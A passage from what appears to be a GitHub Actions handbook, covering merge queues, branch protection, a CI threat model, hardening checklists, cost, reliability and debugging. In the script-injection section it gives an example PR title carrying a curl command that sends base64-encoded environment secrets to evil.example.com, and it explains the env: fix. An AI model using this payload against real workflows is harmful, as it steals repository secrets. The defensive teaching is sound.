1. Repository settings → Branches → protect `main` → "Require merge queue".
2. **Add `merge_group:` to your CI workflow's triggers.** If you forget, the queue will hang forever waiting for checks that never run.

```yaml
on:
  pull_request:
  merge_group:
```

3. Handle the different context — `github.ref` in a merge group is `refs/heads/gh-readonly-queue/main/pr-123-abc`, and there is no `github.event.pull_request`:

```yaml
concurrency:
  group: ci-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

⚠️ 💰 The merge queue multiplies CI runs. With a batch size of 5 you run CI on up to 5 speculative merges. Tune `Maximum pull requests to build` and `Merge method` to balance throughput against cost. It is worth it when `main` breaks often; overkill for a three-person team.

### 47.3 Branch protection: the minimum viable set

- [ ] Require a pull request before merging, with at least 1 approval.
- [ ] Dismiss stale approvals when new commits are pushed.
- [ ] Require review from Code Owners for sensitive paths.
- [ ] Require status checks to pass — **just `CI Gate`**.
- [ ] Require branches to be up to date before merging (or use the merge queue, which subsumes this).
- [ ] Require conversation resolution.
- [ ] Require signed commits (if your org needs it).
- [ ] Do not allow force pushes or deletions.
- [ ] Include administrators (exempting admins defeats the purpose).

Encode this as a **ruleset** rather than legacy branch protection, so you can apply it org-wide and manage it via API.

### 47.4 GitFlow, and when it is justified

GitFlow (`develop`, `release/*`, `hotfix/*`, `main`) is heavyweight and usually inappropriate for a service you deploy continuously. It is genuinely justified when you ship **versioned software that customers install** and must support multiple versions simultaneously — an on-prem product, a mobile app with staged rollouts, a library with LTS branches.

If you do use it:

```yaml
on:
  push:
    branches:
      - main            # production releases
      - develop         # integration, deploys to dev
      - 'release/**'    # release candidates, deploys to staging
      - 'hotfix/**'     # urgent fixes, deploys to staging then production
```

```yaml
      - id: env
        run: |
          case "${GITHUB_REF_NAME}" in
            main)       echo "target=production" >> "$GITHUB_OUTPUT" ;;
            develop)    echo "target=dev" >> "$GITHUB_OUTPUT" ;;
            release/*)  echo "target=staging" >> "$GITHUB_OUTPUT" ;;
            hotfix/*)   echo "target=staging" >> "$GITHUB_OUTPUT" ;;
          esac
```

---
## Chapter 48 — Security Hardening: A Threat Model

### 48.1 Think like an attacker

```mermaid
flowchart TD
    A["Attacker goal:<br/>run code in your pipeline<br/>or steal your secrets"]
    A --> V1["1. Compromise a third-party action<br/>(move a tag, publish a malicious version)"]
    A --> V2["2. Open a malicious PR<br/>(pwn request via pull_request_target)"]
    A --> V3["3. Script injection via<br/>untrusted event data"]
    A --> V4["4. Poison a cache or artifact"]
    A --> V5["5. Compromise a dependency<br/>(postinstall, Maven plugin, Gradle init script)"]
    A --> V6["6. Abuse an over-permissive<br/>GITHUB_TOKEN or OIDC trust policy"]
    A --> V7["7. Attack a persistent<br/>self-hosted runner"]
    A --> V8["8. Trigger a privileged workflow<br/>they should not be able to trigger"]

    V1 --> D1["Pin SHAs · allowlist actions · Dependabot"]
    V2 --> D2["Avoid pull_request_target ·<br/>pull_request + workflow_run pattern ·<br/>event policies"]
    V3 --> D3["Never interpolate event data into run: ·<br/>use env: · CodeQL actions queries"]
    V4 --> D4["cache-mode: read on PR workflows ·<br/>scoped keys · verify digests"]
    V5 --> D5["Lockfiles · egress filtering ·<br/>no build-time network where possible"]
    V6 --> D6["Least-privilege permissions ·<br/>OIDC bound to environment claims"]
    V7 --> D7["Ephemeral runners · never on public repos ·<br/>network segmentation"]
    V8 --> D8["Workflow execution protections ·<br/>actor rules · environment gates"]
```

### 48.2 The `pull_request_target` family of attacks

Covered in §6.3. The summary rules:

1. Do not use `pull_request_target` unless you need write access on a fork PR.
2. If you do, **never check out or execute the PR's code.**
3. Prefer the `pull_request` → artifact → `workflow_run` pattern (§6.9).
4. From 2 November 2026, GitHub blocks `pull_request_target` by default in public repos anyway.

Equally dangerous is `workflow_run` misuse — the downstream workflow is privileged, so anything it does with artifacts from the untrusted run must treat them as hostile data. Do not `eval` a downloaded file, do not use a downloaded filename as a shell argument without validation, and do not trust a PR number read from an artifact without verifying it against the API.

### 48.3 Script injection — the most common real vulnerability

```yaml
# ❌ REMOTE CODE EXECUTION
- run: |
    echo "Processing PR: ${{ github.event.pull_request.title }}"
```

An attacker opens a PR titled:

```
"; curl -sX POST https://evil.example.com/x -d "$(env | base64)"; echo "
```

The expression is substituted **into the script text before bash parses it**, so the attacker's command runs with access to every environment variable, including secrets.

**Untrusted fields** — assume anything a non-collaborator can set:

| Field |
|---|
| `github.event.issue.title` / `.body` |
| `github.event.pull_request.title` / `.body` |
| `github.event.comment.body` |
| `github.event.review.body` |
| `github.event.pull_request.head.ref` (the branch name!) |
| `github.event.pull_request.head.repo.description` |
| `github.event.commits.*.message` / `.author.email` / `.author.name` |
| `github.event.discussion.title` / `.body` |
| `github.head_ref` |

**The fix — always pass through `env:`:**

```yaml
# ✅ SAFE — the value becomes an environment variable, never script text
- run: |
    echo "Processing PR: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

Even then, quote it (`"$PR_TITLE"`) so word-splitting cannot surprise you, and validate before using it in a command.

For `actions/github-script`, the same rule applies:

```javascript
// ❌ const title = `${{ github.event.pull_request.title }}`;
// ✅
const title = context.payload.pull_request.title;
```

Enable the CodeQL `actions` language (§31.2) — it detects exactly this pattern.

### 48.4 Self-hosted runner risks

| Risk | Mitigation |
|---|---|
| Public repo → arbitrary code execution on your machine | **Never** attach self-hosted runners to public repos |
| State leaking between jobs | `--ephemeral`, or ARC (pods are ephemeral by construction) |
| Lateral movement into your network | Dedicated VPC/subnet, restrictive security groups, no access to production data stores |
| Credential theft from the runner host | No cloud credentials on the host; use OIDC or IRSA/Workload Identity per pod |
| A compromised runner registering for other repos | Runner groups scoped to specific repositories |
| Docker socket exposure | `containerMode: kubernetes` instead of DinD where possible; avoid mounting `/var/run/docker.sock` |
| Stale runner versions | Monitor the deprecations API (§36.3) |

### 48.5 Egress control

```yaml
- uses: step-security/harden-runner@v2
  with:
    egress-policy: block
    allowed-endpoints: >
      github.com:443
      api.github.com:443
      objects.githubusercontent.com:443
      release-assets.githubusercontent.com:443
      repo.maven.apache.org:443
      ghcr.io:443
      pkg-containers.githubusercontent.com:443
      sts.ap-south-1.amazonaws.com:443
```

Start in `audit` mode, collect the real endpoint list over a week from the generated insights, then switch to `block`. This is the control that catches a compromised transitive dependency exfiltrating data during `npm install` or `mvn package`.

### 48.6 The hardening checklist

**Workflow configuration**
- [ ] `permissions: contents: read` at the top of every workflow; grant more per job.
- [ ] Organisation default token permission set to read-only.
- [ ] Third-party actions pinned to full commit SHAs.
- [ ] Allowed-actions policy with an explicit allowlist.
- [ ] No `pull_request_target` (or strictly limited to non-code-executing jobs).
- [ ] No untrusted event data interpolated into `run:` or `script:`.
- [ ] `timeout-minutes` on every job.
- [ ] `cache-mode: read` (or `none`) on workflows handling untrusted input.

**Secrets and identity**
- [ ] OIDC for all cloud access; no stored cloud keys.
- [ ] OIDC trust policies bound to `environment:` or `job_workflow_ref`, never `repo:*`.
- [ ] Production secrets only in environment secrets with branch restrictions and reviewers.
- [ ] Organisation secrets limited to selected repositories.
- [ ] No secrets in job outputs, artifacts or caches.
- [ ] Secret scanning with push protection enabled.

**Supply chain**
- [ ] Lockfiles committed and enforced (`npm ci`, `mvn -o` where feasible, `go.sum`).
- [ ] Dependency review blocking new high-severity vulnerabilities on PRs.
- [ ] Dependabot enabled and grouped.
- [ ] Images scanned; unfixed criticals block.
- [ ] SBOM generated and attested.
- [ ] Images signed; signature verified at deploy and, ideally, at admission.
- [ ] Build provenance attestations enabled.

**Governance**
- [ ] Workflow execution protections: actor and event rules on deploy and ops workflows.
- [ ] Environments with required reviewers for production.
- [ ] Audit log streamed to a SIEM.
- [ ] Self-hosted runners in restricted runner groups, ephemeral, never on public repos.
- [ ] Periodic access review.

**Runtime**
- [ ] `harden-runner` with egress blocking on jobs that touch secrets.
- [ ] `persist-credentials: false` on checkouts in untrusted contexts.
- [ ] CodeQL with the `actions` language enabled.

---

## Chapter 49 — Performance and Cost Engineering

### 49.1 Measure before optimising

```yaml
- name: Time the build
  run: |
    START=$(date +%s)
    mvn -B -ntp verify
    echo "BUILD_SECONDS=$(( $(date +%s) - START ))" >> "$GITHUB_ENV"
```

Better: use the job timing data from §41.3 and find the critical path. Optimising a job that runs in parallel with a longer one buys you nothing.

```mermaid
flowchart LR
    subgraph BEFORE["Before — 18 min critical path"]
        A1["checkout 30s"] --> A2["setup-java 45s"] --> A3["mvn verify 14m"] --> A4["docker build 3m"]
    end
    subgraph AFTER["After — 7 min critical path"]
        B1["checkout 20s<br/>shallow"] --> B2["setup-java 5s<br/>cached"] --> B3["mvn -T 1C verify 5m<br/>parallel + warm cache"] --> B4["docker build 90s<br/>layer cache"]
    end
```

### 49.2 The optimisation playbook, in order of payoff

| Rank | Technique | Typical saving |
|---|---|---|
| 1 | **Cache dependencies properly** (right key, `restore-keys`, warmed on `main`) | 2–10 min |
| 2 | **Parallelise jobs** rather than one long serial job | 30–60% wall clock |
| 3 | **`concurrency` with `cancel-in-progress`** on PRs | 💰 20–40% of minutes |
| 4 | **Change detection** — do not build what did not change | 💰 50–90% in monorepos |
| 5 | **Docker layer caching + good layer ordering** | 2–5 min per image |
| 6 | **Shallow clone** (`fetch-depth: 1`) | 10 s – 4 min on big repos |
| 7 | **Split slow tests into shards** | linear |
| 8 | **Move slow checks off the PR gate** to `main`/nightly | perceived latency |
| 9 | **Larger or ARM runners** for CPU-bound work | 30–60%, at a cost |
| 10 | **`--no-daemon` / `-o` offline flags**, avoid re-resolving dependencies | seconds |
| 11 | **Skip redundant steps** (`if: steps.cache.outputs.cache-hit != 'true'`) | varies |
| 12 | **Reduce artifact size and retention** | 💰 storage |

### 49.3 Common time sinks

| Symptom | Cause | Fix |
|---|---|---|
| Every run downloads all dependencies | Cache key changes every run, or the cache is never written on `main` | Hash the lockfile; warm the cache on `main` |
| Long queue times | Concurrency limit reached | Fewer parallel jobs, self-hosted runners, or a plan upgrade |
| `setup-java` takes 60 s | Requesting a version not in the tool cache | Use a version the runner image ships |
| `apt-get install` every run | Installing tools at runtime | Use a preinstalled tool, or a custom runner image |
| Docker build never cached | No `cache-from`/`cache-to`, or `COPY . .` before dependency install | Fix layer order; add a cache backend |
| Checkout takes 3 minutes | `fetch-depth: 0` on a large repo | Use depth 1 unless you need history |
| Tests take 20 minutes | Serial execution | Shard, or increase test-framework parallelism |

### 49.4 Understanding the bill

💰 Billing dimensions:

| Dimension | Notes |
|---|---|
| **Minutes** | Per-minute rate varies by OS and runner size. Windows ≈ 2× Linux; macOS ≈ 10× Linux |
| **Rounding** | Each job is rounded **up to the nearest minute**. A 5-second job costs a full minute |
| **Public repos** | Free on standard GitHub-hosted runners |
| **Self-hosted** | Free of Actions minutes; you pay your own infrastructure |
| **Storage** | Artifacts + Packages, billed per GB-month |
| **Included allowances** | Vary by plan; overage is billed |

Two immediate consequences:
- **Many tiny jobs are expensive.** Ten 20-second jobs cost ten minutes, not three. Consolidate trivial jobs.
- **A matrix multiplies everything.** A 6-leg matrix on a 4-minute job is 24 minutes per run.

### 49.5 Concrete cost reductions

```yaml
# 1. Cancel superseded PR runs — often the single biggest win
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

# 2. Skip drafts
jobs:
  test:
    if: github.event.pull_request.draft == false

# 3. Skip paths that cannot affect the build
on:
  pull_request:
    paths-ignore: ['**.md', 'docs/**', '.github/ISSUE_TEMPLATE/**']

# 4. Right-size the matrix: full matrix nightly, minimal matrix on PRs
strategy:
  matrix:
    java: ${{ github.event_name == 'schedule' && fromJSON('["17","21","25"]') || fromJSON('["21"]') }}

# 5. Short artifact retention
- uses: actions/upload-artifact@v7
  with:
    retention-days: 3

# 6. Timeouts so a hung job cannot burn 6 hours
timeout-minutes: 20
```

### 49.6 A cost report workflow

```yaml
# .github/workflows/cost-report.yml
name: Actions cost report
on:
  schedule: [{ cron: '0 8 * * 1' }]
  workflow_dispatch:

permissions:
  actions: read

jobs:
  report:
    runs-on: ubuntu-24.04
    steps:
      - env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          set -euo pipefail
          SINCE="$(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%SZ)"
          gh api --paginate \
            "/repos/${GITHUB_REPOSITORY}/actions/runs?created=>=${SINCE}&per_page=100" \
            --jq '.workflow_runs[] | {id, name}' > runs.jsonl

          echo "| Workflow | Runs | Billable minutes (est.) |" > report.md
          echo "|---|---:|---:|" >> report.md

          jq -r '.id' runs.jsonl | while read -r id; do
            gh api "/repos/${GITHUB_REPOSITORY}/actions/runs/${id}/timing" \
              --jq '.billable | to_entries | map("\(.key) \(.value.total_ms)") | .[]' 2>/dev/null || true
          done | awk '{ os[$1] += $2 } END { for (o in os) printf "%s: %d minutes\n", o, os[o]/60000 }' \
            >> report.md

          cat report.md >> "$GITHUB_STEP_SUMMARY"
```

### 49.7 When self-hosted becomes cheaper

Rough model: compare `monthly_minutes × per_minute_rate` against the cost of running an equivalent fleet, plus the engineering time to operate it (which is the part everyone underestimates — budget at least 0.2 FTE).

Self-hosted usually wins when:
- You consistently exceed roughly 50,000 Linux minutes a month, **and**
- You already run Kubernetes (so ARC is incremental complexity, not new complexity), **and**
- Your jobs are long-running rather than a high volume of tiny jobs (scale-from-zero latency matters).

Third-party hosted runners are the middle path: most of the cost saving, none of the operations.

---

## Chapter 50 — Reliability Engineering for Pipelines

### 50.1 Your pipeline is production infrastructure

If CI is down, nobody ships. If CI is unreliable, people learn to ignore it, which is worse. Give it the same rigour as a service: an SLO, monitoring, and an owner.

Suggested SLOs:

| Metric | Target |
|---|---|
| PR gate success rate on unchanged code (i.e. not flaky) | > 99% |
| PR gate p95 duration | < 12 min |
| Queue time p95 | < 60 s |
| Deploy workflow success rate | > 98% |
| Time to restore a broken `main` | < 60 min |

### 50.2 Flakiness is the main enemy

```mermaid
flowchart TD
    A["A flaky test appears"] --> B["Developers rerun until green"]
    B --> C["Reruns become normal"]
    C --> D["A REAL failure is rerun too"]
    D --> E["Broken code reaches main"]
    E --> F["Trust in CI collapses"]
    F --> G["People stop reading CI output"]
    G --> H["CI provides no value<br/>but still costs money"]
```

Countermeasures, in order:

1. **Detect** — the rerun heuristic from §41.6.
2. **Quarantine** — move a known-flaky test to a non-blocking job immediately, with an issue and an owner.
   ```yaml
   - name: Quarantined tests (non-blocking)
     continue-on-error: true
     run: mvn -B test -Dgroups=quarantine
   ```
3. **Fix or delete.** A quarantined test with no owner after 30 days should be deleted. An unreliable test is worse than no test.
4. **Prevent** — the usual causes: `Thread.sleep` instead of awaiting a condition, shared mutable state between tests, dependence on execution order (`-shuffle=on` catches this), real network calls, time-of-day dependence, and unseeded randomness.

### 50.3 Designing for partial platform failures

GitHub Actions has incidents. Design so a degraded platform does not block everything:

| Failure | Mitigation |
|---|---|
| Cache service down | Cache steps fail soft by design — the job still works, just slower. Never `needs:` a cache |
| Artifact service down | Add `continue-on-error: true` to non-essential uploads (reports), not to essential ones |
| Registry unreachable | Retry with backoff; consider a pull-through cache |
| Runner queue saturated | A self-hosted overflow pool: `runs-on: ${{ inputs.runner \|\| 'ubuntu-24.04' }}` |
| Actions fully down | Have a documented manual deploy procedure. Test it annually |

### 50.4 Timeouts everywhere

```yaml
jobs:
  build:
    timeout-minutes: 20                 # job
    steps:
      - name: Call the vendor API
        timeout-minutes: 3              # step
        run: |
          curl --max-time 30 --retry 3 --retry-delay 5 ...   # and in the tool
```

Three layers. The innermost should fire first, giving you a clear error instead of an opaque job timeout.

### 50.5 Make failures diagnosable

The difference between a 5-minute fix and a 2-hour investigation is what the failed run captured.

```yaml
      - name: Capture diagnostics
        if: failure()
        run: |
          mkdir -p diag
          # What was the environment?
          env | grep -v -i -E 'token|secret|password|key' | sort > diag/env.txt
          df -h > diag/disk.txt
          free -m > diag/mem.txt
          docker ps -a > diag/containers.txt 2>/dev/null || true
          docker compose logs --no-color > diag/compose.txt 2>/dev/null || true
          # What did the build produce?
          find . -name '*.log' -newermt '-1 hour' -exec cp --parents {} diag/ \; 2>/dev/null || true
          cp -r target/surefire-reports diag/ 2>/dev/null || true
          # Heap dumps if the JVM died
          cp *.hprof diag/ 2>/dev/null || true

      - if: failure()
        uses: actions/upload-artifact@v7
        with:
          name: diagnostics-${{ github.job }}-${{ github.run_attempt }}
          path: diag/
          retention-days: 7
```

### 50.6 Runbook for "main is broken"

1. **Revert first, investigate second.** `gh pr create` reverting the offending commit, merged immediately.
2. Notify the channel that `main` is broken and that a revert is in flight.
3. Confirm with a rerun.
4. The original author fixes forward in a new PR.
5. Post-incident: was this preventable by a check that should have been on the PR gate? If yes, add it.

Automate step 1's detection:

```yaml
# on: workflow_run of CI on main, conclusion == failure
      - name: Identify the breaking commit
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          SHA='${{ github.event.workflow_run.head_sha }}'
          PR="$(gh api "/repos/${GITHUB_REPOSITORY}/commits/${SHA}/pulls" --jq '.[0].number // empty')"
          echo "Broken by ${SHA}, PR #${PR:-unknown}"
          echo "REVERT_CMD=gh pr revert ${PR}" >> "$GITHUB_STEP_SUMMARY"
```

---

## Chapter 51 — Observability, Analytics and DORA Metrics

Covered as a workflow category in Chapter 41. This chapter is about what to *do* with the data.

### 51.1 The dashboard you actually need

| Panel | Query | Action threshold |
|---|---|---|
| PR gate p50 / p95 duration, 30-day trend | job duration by workflow | p95 > 12 min → optimise |
| Success rate on `main`, 7-day | conclusion by branch | < 95% → stop and fix |
| Rerun rate | runs with `run_attempt > 1` | > 5% → flakiness problem |
| Queue time p95 | `run_started_at - created_at` | > 60 s → capacity problem |
| Cache hit rate | from cache step outputs | < 80% → key design problem |
| Minutes by workflow, month to date | timing API | vs budget |
| Deployment frequency | production deploys per week | trending down → investigate friction |
| Lead time p50 | first commit → production | your headline delivery metric |
| Change failure rate | rollbacks / deploys | > 15% → your gate is inadequate |
| Time to restore | incident start → fix deployed | |

### 51.2 Making the data actionable

The pattern that works: **a weekly 20-minute review** of the CI health report (§41.5) with a rotating owner who is allowed to spend a day on the top item. Without an explicit owner and time allocation, CI performance monotonically degrades — every individual change makes it slightly slower and nobody is responsible for the aggregate.

### 51.3 Step-level attribution

When a job is slow, you need to know which step. The jobs API returns per-step timings (§41.3). Render them:

```yaml
      - name: Step timing breakdown
        if: always()
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
        run: |
          gh api "/repos/${GITHUB_REPOSITORY}/actions/runs/${GITHUB_RUN_ID}/jobs" \
            --jq '.jobs[] | "### \(.name)\n" +
                  ([.steps[] | select(.started_at and .completed_at) |
                    "- \(.name): \(((.completed_at|fromdateiso8601)-(.started_at|fromdateiso8601)))s"]
                   | join("\n"))' >> "$GITHUB_STEP_SUMMARY"
```

### 51.4 Correlating pipeline and application telemetry

The highest-value integration: tag your deployments in your APM so a latency graph shows deploy markers.

```yaml
      - name: Send a deployment marker
        run: |
          curl -sf -X POST "https://api.datadoghq.com/api/v1/events" \
            -H "DD-API-KEY: $DD_API_KEY" -H 'Content-Type: application/json' -d @- <<JSON
          {
            "title": "Deploy ${{ inputs.version }} to ${{ inputs.environment }}",
            "text": "Commit ${{ github.sha }} by ${{ github.triggering_actor }}",
            "tags": ["service:api","env:${{ inputs.environment }}","version:${{ inputs.version }}","source:github-actions"],
            "alert_type": "info"
          }
          JSON
        env:
          DD_API_KEY: ${{ secrets.DATADOG_API_KEY }}
```

Now "did the p99 jump at 14:32 because of the deploy?" is answerable in one glance.

---

## Chapter 52 — Debugging and Testing Workflows

### 52.1 The debugging ladder

```mermaid
flowchart TD
    A["Workflow fails"] --> B["1. Read the failing step's log carefully<br/>(the actual error is often 200 lines up)"]
    B --> C["2. Add echo/printenv and rerun"]
    C --> D["3. Enable debug logging<br/>ACTIONS_STEP_DEBUG / ACTIONS_RUNNER_DEBUG"]
    D --> E["4. Dump the event payload<br/>toJSON(github.event)"]
    E --> F["5. Upload diagnostics as artifacts"]
    F --> G["6. Interactive SSH session with tmate"]
    G --> H["7. Reproduce locally with act<br/>or a container matching the runner image"]
```

### 52.2 Debug logging

Set repository secrets or variables:

| Name | Value | Effect |
|---|---|---|
| `ACTIONS_STEP_DEBUG` | `true` | Shows `core.debug()` output from every action |
| `ACTIONS_RUNNER_DEBUG` | `true` | Verbose runner diagnostics, uploaded as an artifact |

Or re-run a single workflow from the UI with "Enable debug logging" ticked — which is better, because it is temporary.

### 52.3 Dumping context

```yaml
      - name: Dump contexts
        env:
          GITHUB_CONTEXT: ${{ toJSON(github) }}
          JOB_CONTEXT: ${{ toJSON(job) }}
          STEPS_CONTEXT: ${{ toJSON(steps) }}
          NEEDS_CONTEXT: ${{ toJSON(needs) }}
          MATRIX_CONTEXT: ${{ toJSON(matrix) }}
          VARS_CONTEXT: ${{ toJSON(vars) }}
        run: |
          echo "$GITHUB_CONTEXT" | jq '.event' > /tmp/event.json
          echo "--- job ---";    echo "$JOB_CONTEXT"
          echo "--- steps ---";  echo "$STEPS_CONTEXT"
          echo "--- needs ---";  echo "$NEEDS_CONTEXT"
          echo "--- matrix ---"; echo "$MATRIX_CONTEXT"
          echo "--- vars ---";   echo "$VARS_CONTEXT"
      - uses: actions/upload-artifact@v7
        with: { name: event-payload, path: /tmp/event.json }
```

⚠️ Never dump `toJSON(secrets)`. It will be masked in the log, but it can leak through an artifact.

### 52.4 Interactive debugging with tmate

```yaml
      - name: Debug session
        if: failure() && github.event_name == 'workflow_dispatch'
        uses: mxschmitt/action-tmate@v3
        with:
          limit-access-to-actor: true
          detached: false
```

This prints an SSH command; you connect and get a shell on the runner exactly as the job left it.

⚠️ Use with real care:
- Always `limit-access-to-actor: true`, or anyone who reads the log can connect.
- Gate it behind `workflow_dispatch` with an input, so it can never trigger on a PR.
- The job stays alive (and billed) while you are connected. Keep `timeout-minutes` set.
- **Never** on a workflow that has production secrets in the environment.

```yaml
on:
  workflow_dispatch:
    inputs:
      debug_enabled:
        type: boolean
        default: false
# ...
      - if: inputs.debug_enabled
        uses: mxschmitt/action-tmate@v3
        with: { limit-access-to-actor: true }
```

### 52.5 Local testing with `act`

```bash
# install
brew install act        # or see the project README

# run the default push event
act

# run a specific job for a specific event
act pull_request -j lint

# with secrets and variables
act -j build --secret-file .secrets --var-file .vars

# with a fuller runner image (the default is minimal and lacks many tools)
act -P ubuntu-24.04=catthehacker/ubuntu:full-24.04

# with a custom event payload
act issue_comment -e event.json
```

⚠️ `act` is a good approximation, not a simulator. It does not implement: the real cache service, artifact service, OIDC, environments and approvals, concurrency, or the exact runner image. Use it for iterating on *shell logic*, not for validating a deployment pipeline.

### 52.6 Static validation

```yaml
# .github/workflows/validate-workflows.yml
name: Validate workflows
on:
  pull_request:
    paths: ['.github/**']

permissions:
  contents: read

jobs:
  actionlint:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@v7
      - run: |
          bash <(curl -sSf https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)
          ./actionlint -color -shellcheck= -pyflakes=
```

`actionlint` is excellent and catches: invalid expressions, unknown contexts, references to undefined job outputs, bad `needs` references, invalid `runs-on` labels, shellcheck issues inside `run:` blocks, and glob syntax errors. **Add it to your PR gate.** It turns a class of "push, wait 4 minutes, fail" into "fail in 10 seconds".

Also useful: `zizmor` for security-focused workflow auditing, and the CodeQL `actions` language.

### 52.7 The fast iteration loop

Editing a workflow and pushing to see if it works is a slow loop. Speed it up:

1. **`actionlint` locally** before pushing. Catches most syntax and expression errors instantly.
2. **A scratch branch and a scratch workflow** with `on: push` and a short job, so you are not waiting for the full pipeline.
3. **`workflow_dispatch` with inputs** so you can re-run without a new commit.
4. **Put complex logic in a script file**, not inline YAML. `./scripts/deploy.sh` can be tested locally; a 60-line inline bash block cannot.

```yaml
      - run: ./scripts/deploy.sh
        env:
          ENVIRONMENT: ${{ inputs.environment }}
          IMAGE: ${{ inputs.image }}
```

🧠 This last point is the biggest practical lever. **Workflows should orchestrate; scripts should implement.** A workflow file full of long bash blocks is untestable and unreviewable. Move the logic into `scripts/`, keep the YAML thin, and you can run and debug everything on your laptop.

### 52.8 Common error messages decoded

| Error | Cause |
|---|---|
| `Unrecognized named-value: 'env'` | Using `env.X` in a job-level `if:` or `strategy:`. See §9.5 |
| `The workflow is not valid. ... Unexpected value` | YAML schema error; run actionlint |
| `Error: Container action is only supported on Linux` | A Docker action on a Windows/macOS runner |
| `Resource not accessible by integration` | Missing `permissions:` scope |
| `fatal: not a git repository` | `actions/checkout` missing or a wrong `working-directory` |
| `Unable to resolve action X, repository not found` | Typo, private repo without access, or a deleted action |
| `No such file or directory` on a local action | Local action used before `actions/checkout` |
| `The job was canceled because "X" failed` | `fail-fast: true` on a matrix |
| `Process completed with exit code 143` | SIGTERM — cancelled or out of memory |
| `You have exceeded a secondary rate limit` | Too many API calls; add backoff, use `--paginate` sparingly |
| Cache always misses | Key changes every run, or the branch has never had a cache written on its base |
| `Error: Input required and not supplied` | A `with:` input missing, often because an expression evaluated to empty |

---

## Chapter 53 — Limits, Quotas and Billing

### 53.1 The numbers to know

| Limit | Value |
|---|---|
| Job execution time | 6 hours (default `timeout-minutes: 360`) |
| Workflow run time | 35 days, including queue time |
| Queue time before a job is dropped | 24 hours |
| Matrix jobs per workflow run | 256 |
| Reusable workflow nesting | 4 levels |
| Reusable workflows callable per workflow file | 20 |
| `workflow_dispatch` inputs | 10 |
| Job outputs total size | ~1 MB |
| Step summary size | 1 MiB per step |
| Repository cache | 10 GB, LRU eviction, 7-day unused expiry |
| Artifact retention | 90 days default; up to 400 for private repos |
| Log retention | 90 days (400 configurable for private) |
| Self-hosted runners per repo/org/enterprise | 1,000 / 10,000 / 10,000 |
| API requests per job using `GITHUB_TOKEN` | 1,000 per hour per repository |
| Workflow file size | 512 KB |
| Concurrent jobs | Depends on plan; macOS has a much lower separate cap |
| Reruns per workflow run | 📌 50 (introduced 2026) |
| Annotations displayed per step | 10 each of error/warning/notice |

### 53.2 Concurrency limits by plan

The exact numbers change; check your plan's documentation. The structure is:
- A total concurrent job limit per account.
- A much smaller, separate macOS concurrency limit.
- Self-hosted runners have their own limit, independent of the hosted allowance.

⚠️ Concurrency is **per account, shared across all repositories**. One team's runaway matrix can starve everyone else. This is an argument for `max-parallel` on large matrices in shared orgs.

### 53.3 Billing model summary

```mermaid
flowchart TD
    A["Actions bill"] --> B["Compute minutes"]
    A --> C["Storage"]
    B --> B1["Linux standard: 1× multiplier"]
    B --> B2["Linux ARM: cheaper"]
    B --> B3["Windows: ~2×"]
    B --> B4["macOS: ~10×"]
    B --> B5["Larger runners: scales with vCPU"]
    B --> B6["Self-hosted: 0 Actions minutes"]
    B --> B7["Public repos on standard runners: free"]
    C --> C1["Artifacts: GB-months"]
    C --> C2["Packages/GHCR: GB-months + egress"]
    C --> C3["Cache: free, but capped at 10 GB/repo"]
    B1 --> R["Every job rounded UP to the minute"]
```

### 53.4 API rate limits inside workflows

`GITHUB_TOKEN` gets 1,000 requests per hour per repository, per job. A workflow that paginates through thousands of items will hit this.

```yaml
      - uses: actions/github-script@v9
        with:
          retries: 3
          retry-exempt-status-codes: 400,401,403,404,422
          script: |
            // github.paginate handles pagination and respects rate limits
            const prs = await github.paginate(github.rest.pulls.list, {
              ...context.repo, state: 'open', per_page: 100,
            });
            core.info(`Found ${prs.length} open PRs`);
```

Check your remaining budget:

```yaml
      - run: gh api /rate_limit --jq '.resources.core'
        env: { GH_TOKEN: ${{ secrets.GITHUB_TOKEN }} }
```

If you need more, a GitHub App token has a higher, separately-counted limit.

---
## Chapter 54 — Governance at Organisation Scale

### 54.1 The settings that matter most

Organisation → Settings → Actions → General:

| Setting | Recommended value | Why |
|---|---|---|
| Actions permissions | Allow local + selected actions | Stops arbitrary third-party code |
| Require SHA pinning | On | Blocks the moved-tag attack |
| Workflow permissions | Read repository contents | Least privilege by default |
| Allow GitHub Actions to create and approve pull requests | Off unless needed | A bot approving its own PR defeats review |
| Fork pull request workflows from outside collaborators | Require approval for first-time contributors (at minimum) | Stops drive-by resource abuse |
| Artifact and log retention | 30–90 days | 💰 |
| Self-hosted runner groups | Restricted to selected repositories | Blast radius |

### 54.2 The `.github` repository

A repository literally named `.github` in your organisation provides defaults to every repo:

```
my-org/.github/
├── workflow-templates/            # "starter workflows" offered in the Actions tab
│   ├── java-service-ci.yml
│   ├── java-service-ci.properties.json
│   ├── go-service-ci.yml
│   └── go-service-ci.properties.json
├── .github/
│   ├── dependabot.yml
│   └── workflows/                 # workflows that run for the org
├── CODEOWNERS
├── PULL_REQUEST_TEMPLATE.md
├── SECURITY.md
└── CONTRIBUTING.md
```

```json
{
  "name": "Java service CI",
  "description": "Standard CI for a Spring Boot service on the paved road",
  "iconName": "example-icon",
  "categories": ["Java", "Continuous integration"],
  "filePatterns": ["pom.xml$"]
}
```

### 54.3 Required workflows via rulesets

Organisation → Rulesets → New ruleset → target repositories → rule: **Require workflows to pass before merging**.

This injects a workflow from a central repository into the required checks of every targeted repository. The repository owners cannot remove or bypass it.

Use for:
- Mandatory security scanning (CodeQL, secret scan, dependency review)
- SBOM generation
- Licence compliance
- Workflow policy linting

⚠️ Roll out in stages. Start with a small set of repositories, watch the failure rate, then expand. A required workflow that fails on 40% of repositories on day one will get you an exemption request from every team.

### 54.4 Workflow execution protections in practice

Covered in §42.3. The org-scale rollout sequence:

1. Create rules in **evaluate mode** across the organisation.
2. Watch **Insights** for a few weeks to see what would have been blocked.
3. Fix or exempt the legitimate cases.
4. Switch to **enforce**.
5. Manage subsequent changes through the **REST API**, as code in a policy repository.

```mermaid
flowchart LR
